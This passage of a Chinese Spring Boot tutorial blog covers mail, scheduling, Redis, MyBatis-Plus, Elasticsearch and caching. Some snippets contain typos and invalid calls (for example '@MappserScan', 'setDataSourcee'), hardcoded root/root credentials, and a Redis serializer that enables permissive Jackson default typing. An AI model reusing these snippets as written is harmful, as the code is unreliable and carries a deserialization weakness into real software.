class="literal">true</span>);</span><br><span class="line">    helper.setSubject(<span class="string">&quot;subject&quot;</span>);</span><br><span class="line">    helper.setText(<span class="string">&quot;&lt;div&gt;content&lt;/div&gt;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    helper.addAttachment(<span class="string">&quot;file_name&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    helper.setFrom(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    helper.setTo(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    javaMailSender.send(helper.getMimeMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>首先开启功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableScheduling</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoFirstApplication</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		SpringApplication.run(DemoFirstApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建定时任务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleTask</span> &#123;</span><br><span class="line">    <span class="comment">// 秒 分 时 日 月 星期  -  每到 0 秒时执行</span></span><br><span class="line">    <span class="meta">@Scheduled(cron = &quot;0 * * * * 0-7&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他定时任务框架：Quartz，XXL-Job等。</p>
<h3 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h3><p>Kue</p>
<h2 id="整合Redis"><a href="#整合Redis" class="headerlink" title="整合Redis"></a>整合Redis</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-data-redis</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6371</span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">redisTest</span><span class="params">()</span> &#123;</span><br><span class="line">    redisTemplate.opsForValue().set(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">RedisConnection</span> <span class="variable">connection</span> <span class="operator">=</span> redisTemplate.getConnectionFactory().getConnection();</span><br><span class="line">    connection.flushDb();</span><br><span class="line">    connection.flushAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置类，自定义序列化方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory connectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        template.setConnectionFactory(connectionFactory);</span><br><span class="line">        <span class="comment">// Json 序列化 也可以用 fastjson</span></span><br><span class="line">        Jackson2JsonRedisSerializer&lt;Object&gt; jackson2JsonRedisSerializer = <span class="keyword">new</span> <span class="title class_">Jackson2JsonRedisSerializer</span>&lt;Object&gt;(Object.class);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        <span class="type">PolymorphicTypeValidator</span> <span class="variable">validator</span> <span class="operator">=</span> BasicPolymorphicTypeValidator.builder().allowIfBaseType(Object.class).build();</span><br><span class="line">        mapper.activateDefaultTyping(validator, ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(mapper);</span><br><span class="line">        <span class="comment">// String 序列化</span></span><br><span class="line">        <span class="type">StringRedisSerializer</span> <span class="variable">stringRedisSerializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>();</span><br><span class="line">        template.setKeySerializer(stringRedisSerializer);</span><br><span class="line">        template.setHashKeySerializer(stringRedisSerializer);</span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.afterPropertiesSet();</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Pojo对象序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存入Redis</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Json 方式</span></span><br><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">100</span>, <span class="string">&quot;ha&quot;</span>, <span class="number">3</span>);</span><br><span class="line">redisTemplate.opsForValue().set(<span class="string">&quot;student&quot;</span>, s);</span><br></pre></td></tr></table></figure>

<p>实际上，应该建立RedisUtils，设置Key的过期时间</p>
<h2 id="整合MyBatisPlus"><a href="#整合MyBatisPlus" class="headerlink" title="整合MyBatisPlus"></a>整合MyBatisPlus</h2><p>整合MybatisPlus</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mybatis-plus</span><br></pre></td></tr></table></figure>

<p>IDEA可以安装插件<code>MybaitsX</code></p>
<p>导入时与mybatis二选一，有了mybatis plus就不需要mybaits了。</p>
<p>使用方法</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">mapper-location:</span> <span class="comment"># 有默认值</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">&quot;org.apache.ibatis.logging.stdout.StdOutImpl&quot;</span>  <span class="comment"># 日志</span></span><br></pre></td></tr></table></figure>

<p>实体类看可以用的注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableName(&quot;&quot;)</span></span><br><span class="line"><span class="meta">@TableField(exist=false)</span></span><br></pre></td></tr></table></figure>



<p>编写Mapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="comment">// 完成了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;User&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在入口处扫描Mapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@MappserScan(&quot;com.example.demox.mapper&quot;)</span></span><br></pre></td></tr></table></figure>

<p>主键生成策略：</p>
<ul>
<li>uuid</li>
<li>自增ID</li>
<li>雪花算法：主键中包含记录的存储地域，机器号。</li>
<li>Redis 生成</li>
<li>Zookeeper 生成</li>
</ul>
<p>默认方法：全局唯一ID</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableId(type=IdType.ID_WORKER)</span></span><br></pre></td></tr></table></figure>

<p>可以通过条件自动拼接SQL语句。</p>
<p>自动填充，例如修改时间，创建时间：</p>
<p>数据库方式：字段类型<code>datetime</code>，默认值设置为<code>CURRENT_TIMESTAMP</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MybatisPlus方式：字段类型<code>datetime</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableField(fill=FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill=FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再编写一个处理器<code>handler.MyMetaObjectHandler</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjectHandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;start insert fill ....&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.strictUpdateFill(metaObject, <span class="string">&quot;createTime&quot;</span>, () -&gt; LocalDateTime.now(), LocalDateTime.class); <span class="comment">// 起始版本 3.3.3(推荐)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;start update fill ....&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.strictUpdateFill(metaObject, <span class="string">&quot;updateTime&quot;</span>, () -&gt; LocalDateTime.now(), LocalDateTime.class); <span class="comment">// 起始版本 3.3.3(推荐)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>乐观锁：只有出问题时才测试加锁。实现方式，在字段中加入<code>version</code>字段，每次更新一个<code>version</code></p>
<ol>
<li>取出记录，得到<code>version</code></li>
<li>更新时，带上新的<code>version</code>(where version&#x3D;old_version)</li>
<li>如果条件测试失败，就更新失败</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Version</span>  <span class="comment">// 乐观锁</span></span><br><span class="line"><span class="keyword">private</span> Integer version;</span><br></pre></td></tr></table></figure>

<p>注册组件<code>config.MyBatisPlusConfig</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;...&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisPlusConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">OptimisticLockerInnerInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用自旋锁解决乐观锁更新失败的时候。</p>
<p>悲观锁：总是加锁。</p>
<p>分页</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;scan.your.mapper.package&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlusConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        interceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>(DbType.H2));</span><br><span class="line">        <span class="keyword">return</span> interceptor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ConfigurationCustomizer <span class="title function_">configurationCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> configuration -&gt; configuration.setUseDeprecatedExecutor(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Page&lt;User&gt; page = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">1</span>, <span class="number">5</span>); <span class="comment">// Page 1, Records = 5</span></span><br><span class="line">userMapper.selectPage(page, <span class="literal">null</span>);</span><br><span class="line">page.getRecored();</span><br></pre></td></tr></table></figure>

<p>逻辑删除：在数据库中添加<code>deleted</code>字段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableLogic</span></span><br><span class="line"><span class="keyword">private</span> Integer deleted</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ISqlInjector <span class="title function_">sqlInjector</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">logic-delete-value:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">logic-not-delete-value:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>再查询的时候就过滤掉<code>deleted</code>字段。</p>
<p>性能分析插件</p>
<p>首先启动开发环境</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Profile(&#123;&quot;dev&quot;, &quot;test&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> PerformanceInterceptor <span class="title function_">performanceInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">    .setMaxTime(); <span class="comment">// sql 的最大执行时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>条件构造器：用于构建复杂SQL</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">QueryWrapper&lt;User&gt; wrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">wrapper.isNotNull(<span class="string">&quot;name&quot;</span>).isNotNull(<span class="string">&quot;email&quot;</span>).ge(<span class="string">&quot;age&quot;</span>, <span class="number">10</span>);</span><br><span class="line">userMapper.selectList(wrapper);</span><br><span class="line">wrapper.eq(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;john&quot;</span>);</span><br><span class="line">userMapper.selectOne(wrapper);</span><br><span class="line">.notLike().likeRight()  <span class="comment">// xxx%</span></span><br><span class="line">.inSql(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;select id from user where age&lt;3&quot;</span>);  <span class="comment">// 子查询</span></span><br></pre></td></tr></table></figure>

<h2 id="MyBatis-Plus-代码生成器"><a href="#MyBatis-Plus-代码生成器" class="headerlink" title="MyBatis Plus 代码生成器"></a>MyBatis Plus 代码生成器</h2><ol>
<li>导入<code>mybatis plus</code>包</li>
<li>配置数据库</li>
<li>编写配置类</li>
<li>测试类中编写生成器</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AutoGenerator</span> <span class="variable">mpg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AutoGenerator</span>();</span><br><span class="line"><span class="comment">// -&gt; 配置策略</span></span><br><span class="line"><span class="comment">// 1 全局</span></span><br><span class="line"><span class="type">GlobalConfig</span> <span class="variable">gc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GlobalConfig</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">projectPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">gc.getOutputDir(projectPath + <span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">gc.setAuthor(<span class="string">&quot;author name&quot;</span>);</span><br><span class="line">gc.setOpen(<span class="literal">false</span>); <span class="comment">// 是否打开资源管理器</span></span><br><span class="line">gc.setFileOverride(<span class="literal">false</span>); <span class="comment">// 是否覆盖</span></span><br><span class="line">gc.setServiceName(<span class="string">&quot;%sService&quot;</span>); <span class="comment">// 正则表达式 服务命名</span></span><br><span class="line">gc.setIdType(IdType.ID_WORKER)</span><br><span class="line">gc.setDateType(DateType.ONLY_DATE);</span><br><span class="line">gc.setSwagger2(<span class="literal">true</span>);</span><br><span class="line">mpg.setGlobalConfig(gc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 数据源</span></span><br><span class="line"><span class="type">DataSourceConfig</span> <span class="variable">dsc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceConfig</span>();</span><br><span class="line">dsc.setUrl(<span class="string">&quot;jdbc:mysql://localhost:13306/study?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=Asia/Shanghai&quot;</span>);</span><br><span class="line">dsc.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">dsc.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">dsc.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">dsc.setDbType(DbType.MYSQL);</span><br><span class="line">mpg.setDataSourcee(dsc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3 包配置</span></span><br><span class="line"><span class="type">PackageConfig</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>();</span><br><span class="line">pc.setModuleName(<span class="string">&quot;blog&quot;</span>);</span><br><span class="line">pc.setParent(<span class="string">&quot;com.example&quot;</span>);</span><br><span class="line">pc.setEntity(<span class="string">&quot;entity&quot;</span>);</span><br><span class="line">pc.setMapper(<span class="string">&quot;mapper&quot;</span>);</span><br><span class="line">pc.setService(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">pc.setController(<span class="string">&quot;controller&quot;</span>);</span><br><span class="line">mpg.setPackageInfo(pc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4 策略</span></span><br><span class="line"><span class="type">StrategyConfig</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StrategyConfig</span>();</span><br><span class="line">sc.setInclude(<span class="string">&quot;user&quot;</span>); <span class="comment">// 设置要映射的表</span></span><br><span class="line">sc.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">sc.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">sc.setEntityLombokModel(<span class="literal">true</span>);</span><br><span class="line">sc.setLogicDeleteFieldName(<span class="string">&quot;deleted&quot;</span>);  <span class="comment">// 逻辑删除</span></span><br><span class="line">    <span class="type">TableFill</span> <span class="variable">cre</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TableFill</span>(<span class="string">&quot;gmt_create&quot;</span>, FieldFill.INSERT);</span><br><span class="line">    <span class="type">TableFill</span> <span class="variable">mod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TableFill</span>(<span class="string">&quot;gmt_modified&quot;</span>, FieldFill.INSERT_UPDATE);</span><br><span class="line">sc.setTableFillList(Arrays.asList(cre, mod));  <span class="comment">// 自动填充时间</span></span><br><span class="line">sc.setVersionFieldName(<span class="string">&quot;version&quot;</span>);  <span class="comment">// 乐观锁 </span></span><br><span class="line">sc.setRestControllerStyle(<span class="literal">true</span>);  <span class="comment">// 驼峰命名</span></span><br><span class="line">sc.setControllerMappingHyphenStyle(<span class="literal">true</span>); <span class="comment">// 方法名：下划线分割</span></span><br><span class="line">mpg.setStrategy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// &lt;- 配置策略</span></span><br><span class="line">mpg.execute();</span><br></pre></td></tr></table></figure>

<h2 id="Fluent-Mybatis"><a href="#Fluent-Mybatis" class="headerlink" title="Fluent Mybatis"></a>Fluent Mybatis</h2><h2 id="Elastic-Search"><a href="#Elastic-Search" class="headerlink" title="Elastic Search"></a>Elastic Search</h2><p>底层基于Lucene，用于搜索检索，数据分析等，具有RESTful接口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-data-elasticsearch</span><br></pre></td></tr></table></figure>

<p>存入数据</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">PUT /index/entity/id</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;first_name&quot; : &quot;John&quot;,</span><br><span class="line">    &quot;last_name&quot; :  &quot;Smith&quot;,</span><br><span class="line">    &quot;age&quot; :        25,</span><br><span class="line">    &quot;about&quot; :      &quot;I love to go rock climbing&quot;,</span><br><span class="line">    &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他操作 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET    查询</span><br><span class="line">POST   条件查询</span><br><span class="line">PUT    新增或修改</span><br><span class="line">DELETE 删除</span><br><span class="line">HEAD   检查是否存在</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">rest:</span></span><br><span class="line">      <span class="attr">uris:</span> <span class="string">...</span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">RestHighLevelClient restHighLevelClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">  	Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">  	map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;20190909&quot;</span>);</span><br><span class="line">  	map.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;测试&quot;</span>);</span><br><span class="line">  	map.put(<span class="string">&quot;age&quot;</span>, <span class="number">22</span>);</span><br><span class="line">    <span class="comment">// 存入</span></span><br><span class="line">  	<span class="type">IndexRequest</span> <span class="variable">indexRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndexRequest</span>(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;doc&quot;</span>, map.get(<span class="string">&quot;id&quot;</span>).toString()).source(map);</span><br><span class="line">    <span class="type">IndexResponse</span> <span class="variable">indexResponse</span> <span class="operator">=</span> restHighLevelClient.index(indexRequest, RequestOptions.DEFAULT);</span><br><span class="line">    System.out.println(indexResponse.toString());</span><br><span class="line">    <span class="comment">// 检索</span></span><br><span class="line">    <span class="type">SearchRequest</span> <span class="variable">searchRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>().indices(<span class="string">&quot;content&quot;</span>).types(<span class="string">&quot;doc&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取</span></span><br><span class="line">    <span class="type">GetRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetRequest</span>(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;doc&quot;</span>, <span class="string">&quot;20190909&quot;</span>);</span><br><span class="line">    <span class="type">GetResponse</span> <span class="variable">getResponse</span> <span class="operator">=</span> <span class="built_in">this</span>.restHighLevelClient.get(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 更新</span></span><br><span class="line">    <span class="type">UpdateRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UpdateRequest</span>(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;doc&quot;</span>, map.get(<span class="string">&quot;id&quot;</span>).toString()).doc(map);</span><br><span class="line">    <span class="type">UpdateResponse</span> <span class="variable">updateResponse</span> <span class="operator">=</span> restHighLevelClient.update(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 删除</span></span><br><span class="line">    <span class="type">DeleteRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeleteRequest</span>(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;doc&quot;</span>, <span class="string">&quot;20190909&quot;</span>);</span><br><span class="line">    <span class="type">DeleteResponse</span> <span class="variable">deleteResponse</span> <span class="operator">=</span> <span class="built_in">this</span>.restHighLevelClient.delete(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-cache</span><br></pre></td></tr></table></figure>

<p>开启缓存，首先要在主类上打开开关。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApplication</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    SpringApplication.run(MainApplication.class, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相关注解</p>
<p><code>@Cacheable</code>用于方法上，能够根据传入的参数缓存结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// key 表示缓存关键字，为空表示根据所有关键字作为缓存的定义</span></span><br><span class="line"><span class="meta">@Cacheable(cacheNames=&quot;user&quot;, key=&quot;#id&quot;,, condition=&quot;#id &gt; 0&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">selectUserById</span><span class="params">(Integer id)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>@CachePut</code>强行更新缓存，类和方法都可以用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CachePut(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">update</span><span class="params">(Integer id)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>@CacheEvict</code>清除缓存，可以用在类和方法上。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CacheEvict(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">delete</span><span class="params">(Integer id)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>@Caching</code>相对于以上三个注解。</p>
